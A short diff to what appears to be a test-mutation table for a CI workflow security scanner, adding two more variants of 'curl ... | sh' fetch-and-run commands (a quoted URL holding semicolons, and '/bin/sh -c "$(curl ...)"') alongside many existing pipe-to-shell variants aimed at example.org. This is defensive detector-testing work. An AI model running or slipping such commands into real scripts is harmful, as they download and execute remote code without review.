@@ -416,7 +416,8 @@ MUTATIONS = {
             "curl https://example.org/x | { sh; }", "{ curl https://example.org/x; } | sh", "(curl https://example.org/x; echo) | sh",
             "curl https://example.org/x | sudo -u root bash", "curl https://example.org/x | sudo --user root bash",
             "curl https://example.org/x | nice -n 5 bash", "curl https://example.org/x | timeout 10 bash",
-            "curl https://example.org/x | xargs -I{} sh -c '{}'", "curl https://example.org/x | env -i A=1 bash -s")],
+            "curl https://example.org/x | xargs -I{} sh -c '{}'", "curl https://example.org/x | env -i A=1 bash -s",
+            'curl "https://example.org/?a=1;b=2" | sh', '/bin/sh -c "$(curl https://example.org/x)"')],
     ],
     "WF13": [
         job_key("ci", "id-token in ci.yml", ["WF09", "WF13"], "static", "permissions:", "  id-token: write"),
